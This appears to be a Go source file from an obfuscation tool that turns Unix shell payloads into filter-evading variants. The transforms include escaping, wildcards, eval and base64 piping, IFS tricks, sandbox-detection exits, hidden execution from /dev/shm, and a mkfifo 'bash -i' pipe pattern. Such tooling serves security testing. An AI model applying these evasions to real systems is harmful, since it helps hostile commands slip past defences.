package command

import (
	"fmt"
	"math/rand"
	"obfuskit/cmd"
	"obfuskit/evasions"
	"strings"
)

// UnixCmdVariants generates various Unix/Linux command evasion techniques
// based on the specified obfuscation level
func UnixCmdVariants(payload string, level cmd.Level) []string {
	var variants []string

	// Basic evasion techniques
	variants = append(variants,
		backslashEvasion(payload),      // Using backslashes between characters
		quoteVariations(payload),       // Different quote styles
		spacingTechniques(payload),     // Various spacing techniques
		commandChaining(payload),       // Using ; && and || for chaining
		binaryPathObfuscation(payload), // /usr/bin/ path variations
		inlineComments(payload),        // Using inline comments #
		redirectionNoise(payload),      // Adding redirection that does nothing
		wildcardObfuscation(payload),   // Using wildcards in paths
		randomizedCase(payload),        // Random capitalization where possible
		// bashExpansion(payload),         // ${var} style expansion
		// environmentVariables(payload),  // Environment variable substitution
		// variableAssignment(payload),    // Simple variable assignment

	)

	// Return basic variants if level is Basic
	if level == cmd.Basic {
		return evasions.UniqueStrings(variants)
	}

	// Medium level adds more complex techniques
	variants = append(variants,
		bashBraceExpansion(payload),    // Bash brace expansion ${x}
		hexEncoding(payload),           // Hex encoding of characters
		commandEvaluation(payload),     // Using eval and similar constructs
		processSubstitution(payload),   // <() process substitution
		hereStringTechniques(payload),  // Using here-strings
		ifs(payload),                   // IFS (Internal Field Separator) modification
		backticksSubstitution(payload), // Using backticks for command substitution
		stringConcatenation(payload),   // String concatenation techniques
		doubleEvaluation(payload),      // Multiple levels of eval
		teeCommand(payload),            // Using tee for execution
	)

	// Return medium variants if level is Medium
	if level == cmd.Medium {
		return evasions.UniqueStrings(variants)
	}

	// Advanced level adds the most complex evasion techniques
	variants = append(variants,
		base64Techniques(payload),        // Base64 encoding/decoding
		binaryExecution(payload),         // /proc/self/fd technique
		arithmeticExpansion(payload),     // Using arithmetic expansion
		debuggerAvoidance(payload),       // Techniques to avoid debuggers
		revShellTechniques(payload),      // Reverse shell techniques
		fileDescriptorTricks(payload),    // File descriptor manipulation
		unicodeEscapes(payload),          // Unicode escape sequences
		runtimeScriptGeneration(payload), // Generate script at runtime
		fifoTechniques(payload),          // Using FIFO pipes
		functionObfuscation(payload),     // Function-based obfuscation
		advancedIFSTricks(payload),       // Advanced IFS manipulation techniques
	)

	return evasions.UniqueStrings(variants)
}

// Basic evasion techniques

func backslashEvasion(payload string) string {
	result := ""
	for _, char := range payload {
		if rand.Intn(3) == 0 && char > 32 && char < 127 && char != '\\' && char != '\'' && char != '"' {
			result += "\\" + string(char)
		} else {
			result += string(char)
		}
	}
	return result
}

func quoteVariations(payload string) string {
	words := strings.Fields(payload)
	result := ""

	quoteTypes := []string{"'", "\"", "$'", "\"'", "'\""}

	for i, word := range words {
		if i > 0 {
			result += " "
		}

		if i > 0 && rand.Intn(3) == 0 {
			quoteType := quoteTypes[rand.Intn(len(quoteTypes))]
			if quoteType == "$'" {
				// ANSI-C quoting
				result += "$'" + strings.ReplaceAll(word, "'", "\\'") + "'"
			} else {
				result += quoteType + word + reverseQuote(quoteType)
			}
		} else {
			result += word
		}
	}

	return result
}

func reverseQuote(quote string) string {
	if quote == "\"'" {
		return "'\""
	} else if quote == "'\"" {
		return "\"'"
	} else {
		return quote
	}
}

func spacingTechniques(payload string) string {
	words := strings.Fields(payload)
	result := words[0]

	for i := 1; i < len(words); i++ {
		// Add random spaces or tabs
		spacesCount := 1 + rand.Intn(3)
		if rand.Intn(2) == 0 {
			result += strings.Repeat(" ", spacesCount) + words[i]
		} else {
			result += strings.Repeat("\t", 1+rand.Intn(2)) + words[i]
		}
	}

	return result
}

func commandChaining(payload string) string {
	separators := []string{" ; ", " && ", " || ", " | "}
	sep := separators[rand.Intn(len(separators))]

	// Add a harmless command
	harmlessCommands := []string{"true", ":", "echo ''", "test 1", "[ 1 ]"}
	harmless := harmlessCommands[rand.Intn(len(harmlessCommands))]

	if rand.Intn(2) == 0 {
		return harmless + sep + payload
	} else {
		return payload + sep + harmless
	}
}

func binaryPathObfuscation(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Common binary paths and their variations
	pathVariations := []string{
		"/usr/bin/",
		"/bin/",
		"/u??/b?n/",
		"/???/bin/",
		"`which `",
	}

	cmd := parts[0]
	path := pathVariations[rand.Intn(len(pathVariations))]

	// Only apply to commands that don't already have a path
	if !strings.Contains(cmd, "/") {
		parts[0] = path + cmd
	}

	return strings.Join(parts, " ")
}

func inlineComments(payload string) string {
	parts := strings.Fields(payload)
	result := parts[0]

	for i := 1; i < len(parts); i++ {
		if rand.Intn(4) == 0 {
			// Add an inline comment between words
			comments := []string{
				"#nothing",
				"#bypass",
				"#comment",
				"#ignored",
			}
			comment := comments[rand.Intn(len(comments))]
			result += " " + comment + "\n" + parts[i]
		} else {
			result += " " + parts[i]
		}
	}

	return result
}

func variableAssignment(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Create simple variable assignment
	result := "cmd=" + parts[0] + "; $cmd"

	if len(parts) > 1 {
		result += " " + strings.Join(parts[1:], " ")
	}

	return result
}

func redirectionNoise(payload string) string {
	redirections := []string{
		" 2>/dev/null",
		" >/dev/null",
		" 2>&1",
		" 2>/dev/null 1>&2",
		" </dev/null",
	}

	// Add 1-2 redirections
	count := 1 + rand.Intn(2)
	result := payload

	for i := 0; i < count; i++ {
		redirection := redirections[rand.Intn(len(redirections))]
		if !strings.Contains(result, redirection) {
			result += redirection
		}
	}

	return result
}

func wildcardObfuscation(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	cmd := parts[0]
	if len(cmd) <= 2 {
		return payload
	}

	// Insert wildcards within the command name
	result := ""
	for i, c := range cmd {
		if i > 0 && i < len(cmd)-1 && rand.Intn(3) == 0 {
			result += string(c) + "?"
		} else {
			result += string(c)
		}
	}

	parts[0] = result
	return strings.Join(parts, " ")
}

func randomizedCase(payload string) string {
	result := ""
	for _, char := range payload {
		if char >= 'a' && char <= 'z' && rand.Intn(3) == 0 {
			result += strings.ToUpper(string(char))
		} else if char >= 'A' && char <= 'Z' && rand.Intn(3) == 0 {
			result += strings.ToLower(string(char))
		} else {
			result += string(char)
		}
	}
	return result
}

// Medium evasion techniques

func bashBraceExpansion(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Replace with brace expansion
	for i, part := range parts {
		if len(part) > 2 && rand.Intn(2) == 0 {
			midpoint := len(part) / 2
			parts[i] = part[:midpoint] + "{" + part[midpoint:] + "}"
		}
	}

	return strings.Join(parts, " ")
}

func hexEncoding(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Convert the command to hex
	cmd := parts[0]
	hexCmd := ""

	for _, c := range cmd {
		if rand.Intn(2) == 0 {
			hexCmd += fmt.Sprintf("\\x%02x", c)
		} else {
			hexCmd += string(c)
		}
	}

	result := "$'" + hexCmd + "'"

	if len(parts) > 1 {
		result += " " + strings.Join(parts[1:], " ")
	}

	return result
}

func commandEvaluation(payload string) string {
	evalFunctions := []string{
		"eval",
		"$(eval echo '%s')",
		"bash -c '%s'",
		"/bin/sh -c '%s'",
	}

	evalFunc := evalFunctions[rand.Intn(len(evalFunctions))]

	if strings.Contains(evalFunc, "%s") {
		return fmt.Sprintf(evalFunc, payload)
	} else {
		return evalFunc + " '" + payload + "'"
	}
}

func processSubstitution(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	cmd := parts[0]
	args := ""
	if len(parts) > 1 {
		args = " " + strings.Join(parts[1:], " ")
	}

	return fmt.Sprintf("bash -c \"$(echo '%s')%s\"", cmd, args)
}

func hereStringTechniques(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	cmd := parts[0]
	args := ""
	if len(parts) > 1 {
		args = " " + strings.Join(parts[1:], " ")
	}

	return fmt.Sprintf("bash <<< \"%s%s\"", cmd, args)
}

func ifs(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Manipulate IFS to change word splitting behavior
	oldIFS := "oldIFS=$IFS"
	newIFS := "IFS=,$IFS"
	resetIFS := "IFS=$oldIFS"

	return fmt.Sprintf("%s; %s; %s; %s", oldIFS, newIFS, payload, resetIFS)
}

func backticksSubstitution(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	cmd := parts[0]
	args := ""
	if len(parts) > 1 {
		args = " " + strings.Join(parts[1:], " ")
	}

	// Use backticks instead of $()
	return fmt.Sprintf("`echo %s`%s", cmd, args)
}

func stringConcatenation(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	cmd := parts[0]
	if len(cmd) < 3 {
		return payload
	}

	// Split into multiple variables
	midpoint := len(cmd) / 2
	var1 := cmd[:midpoint]
	var2 := cmd[midpoint:]

	result := fmt.Sprintf("a=%s; b=%s; ${a}${b}", var1, var2)

	if len(parts) > 1 {
		result += " " + strings.Join(parts[1:], " ")
	}

	return result
}

func doubleEvaluation(payload string) string {
	// Use multiple layers of eval
	encoded := strings.ReplaceAll(payload, " ", "\\ ")
	return fmt.Sprintf("eval eval echo %s", encoded)
}

func teeCommand(payload string) string {
	// Use tee to write to a temporary file and execute
	return fmt.Sprintf("echo '%s' | tee /dev/shm/.cmd$$ && bash /dev/shm/.cmd$$ && rm /dev/shm/.cmd$$", payload)
}

// Advanced evasion techniques

func base64Techniques(payload string) string {
	// This would actually base64 encode in a real implementation
	// For this example, we'll use a placeholder
	encodedPayload := "ZWNobyAiaGVsbG8gd29ybGQi" // Example base64
	return fmt.Sprintf("echo %s | base64 -d | bash", encodedPayload)
}

func binaryExecution(payload string) string {
	// Execute through /proc/self/fd trick
	return fmt.Sprintf("echo '%s' > /dev/shm/.cmd$$ && exec /bin/bash /proc/self/fd/$(echo $(ls -la /dev/shm/.cmd$$ | awk '{print $4}') | sed 's/[^0-9]//g')", payload)
}

func arithmeticExpansion(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	chars := []byte(parts[0])
	var charCodes []string

	for _, c := range chars {
		charCodes = append(charCodes, fmt.Sprintf("%d", c))
	}

	// Build command using arithmetic expansion
	var commands []string
	for i, code := range charCodes {
		commands = append(commands, fmt.Sprintf("c%d=$((10#%s))", i, code))
	}

	// Build the command string from character codes
	commandBuilder := "cmd=$("
	for i := range charCodes {
		commandBuilder += fmt.Sprintf("printf \\\\$(printf '%03o' $c%d)", i)
	}
	commandBuilder += ")"

	args := ""
	if len(parts) > 1 {
		args = " " + strings.Join(parts[1:], " ")
	}

	return strings.Join(commands, ";") + ";" + commandBuilder + "; $cmd" + args
}

func debuggerAvoidance(payload string) string {
	// Techniques to detect and avoid debuggers/sandbox
	checks := []string{
		"[ -z \"$HISTFILE\" ] && exit 1 || ",
		"[ ! -z \"$DEBUG\" ] && exit 1 || ",
		"(set -x; : ) 2>&1 | grep -q x && exit 1 || ",
	}

	check := checks[rand.Intn(len(checks))]
	return check + payload
}

func revShellTechniques(payload string) string {
	// Variation on reverse shell pattern (not actual rev shell)
	return fmt.Sprintf("(sh -c '%s' > /dev/null 2>&1 &)", payload)
}

func fileDescriptorTricks(payload string) string {
	// File descriptor manipulation
	fdTricks := []string{
		"exec 3>&1; %s >&3 3>&-; exec 3>&-",
		"exec 3<&0; %s <&3 3<&-; exec 3<&-",
		"{ %s; } 2>&1",
	}

	fdTrick := fdTricks[rand.Intn(len(fdTricks))]
	return fmt.Sprintf(fdTrick, payload)
}

func unicodeEscapes(payload string) string {
	result := ""
	for _, c := range payload {
		if rand.Intn(3) == 0 && c > 32 && c < 127 {
			result += fmt.Sprintf("\\u%04X", c)
		} else {
			result += string(c)
		}
	}

	return fmt.Sprintf("$'%s'", result)
}

func runtimeScriptGeneration(payload string) string {
	// Generate a script at runtime and execute it
	return fmt.Sprintf("cat > /dev/shm/.s$$ << 'EOF'\n#!/bin/bash\n%s\nEOF\nchmod +x /dev/shm/.s$$ && /dev/shm/.s$$ && rm /dev/shm/.s$$", payload)
}

func fifoTechniques(payload string) string {
	// Use FIFO pipes for obfuscation
	return fmt.Sprintf("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | { read; echo '%s'; } > /tmp/f; sleep 1; rm -f /tmp/f", payload)
}

func functionObfuscation(payload string) string {
	parts := strings.Fields(payload)
	if len(parts) == 0 {
		return payload
	}

	// Create a function with a random name
	funcName := fmt.Sprintf("f%d", rand.Intn(1000))

	args := ""
	if len(parts) > 1 {
		args = " " + strings.Join(parts[1:], " ")
	}

	return fmt.Sprintf("function %s() { %s \"$@\"; }; %s%s", funcName, parts[0], funcName, args)
}

func advancedIFSTricks(payload string) string {
	// Advanced IFS manipulation for splitting commands
	ifsTricks := []string{
		"IFS=,; set -- %s; IFS=$' \t\n'; $1 ${@:2}",
		"IFS=$'\\x01'; set -- %s; IFS=$' \t\n'; $1 ${@:2}",
		"IFS=$'\\n'; set -- $(echo \"%s\" | tr ' ' '\\n'); IFS=$' \t\\n'; \"$@\"",
	}

	// Replace spaces with commas for the first two variants
	commaPayload := strings.ReplaceAll(payload, " ", ",")

	ifsTrick := ifsTricks[rand.Intn(len(ifsTricks))]
	if rand.Intn(2) == 0 {
		return fmt.Sprintf(ifsTrick, commaPayload)
	} else {
		return fmt.Sprintf(ifsTrick, payload)
	}
}
